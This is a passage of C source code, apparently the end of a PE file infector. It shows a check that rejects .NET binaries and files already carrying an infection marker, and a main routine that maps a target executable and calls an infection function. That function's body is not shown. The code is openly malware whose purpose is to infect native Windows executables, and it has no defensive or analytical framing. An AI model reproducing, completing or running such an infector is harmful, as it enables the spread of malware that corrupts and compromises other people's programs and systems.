    if (peGetDataDirectory(pe, IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR) != NULL) {
        printf("PE file is .NET, must be a native executable\n");
        return FALSE;
    }

    marker = RVA_TO_PTR(pe->dos, MARKER_OFFSET);
    if (*marker == MARKER_VALUE) {
        printf("PE file is already infected\n");
        return FALSE;
    }

    return TRUE;
}

//
// Application entry point.
//
int main(int argc, char *argv[])
{
    BOOL        success = FALSE;
    const CHAR  *inputFile;
    MAPPED_FILE mapped;
    PE_HEADERS  pe;

    if (argc != 2) {
        fprintf(stderr, "usage: %s <target file>\n", argv[0]);
        return -1;
    }
    inputFile = argv[1];

    ZeroMemory(&mapped, sizeof(MAPPED_FILE));
    ZeroMemory(&pe, sizeof(PE_HEADERS));

    puts(m_header);
    printf("Target file: %s\n", inputFile);

    if (mappedOpen(inputFile, &mapped)) {
        if (peGetHeaders(&mapped, &pe) && peIsSupported(&pe)) {
            success = peInfect(&mapped, &pe);
        }
        mappedClose(&mapped);
    }

    if (!success) {
        printf("Falied\n");
        return -1;
    }
    printf("Finished\n");
    return 0;
}
